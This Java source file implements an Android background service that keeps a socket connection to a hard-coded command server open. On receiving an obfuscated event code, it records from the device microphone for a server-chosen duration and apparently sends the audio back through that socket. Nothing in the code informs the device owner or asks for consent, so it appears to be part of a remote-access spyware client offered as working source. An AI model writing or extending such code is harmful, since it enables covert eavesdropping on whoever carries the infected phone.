package com.example.client;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class SocketService extends Service {
    private static final String TAG = "SocketService";
    // Update SERVER_URL to your server’s address and port.
    private static final String SERVER_URL = "http://10.194.49.56:2020";
    private static final String MIC_EVENT = "x0000mc";
    private Socket mSocket;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            mSocket = IO.socket(SERVER_URL, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket URI error", e);
        }
        if (mSocket != null) {
            mSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(TAG, "Connected to server");
                }
            }).on(MIC_EVENT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (args.length > 0 && args[0] instanceof JSONObject) {
                        JSONObject data = (JSONObject) args[0];
                        try {
                            int seconds = data.getInt("sec");
                            boolean saveLocal = data.optBoolean("saveLocal", false);
                            Log.d(TAG, "Mic command received: record for " + seconds + " sec, saveLocal: " + saveLocal);
                            // Start recording audio
                            AudioRecorder.startRecording(seconds, saveLocal, mSocket);
                        } catch (Exception e) {
                            Log.e(TAG, "Error processing mic command", e);
                        }
                    }
                }
            });
            mSocket.connect();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mSocket != null) {
            mSocket.disconnect();
            mSocket.off();
        }
    }
}
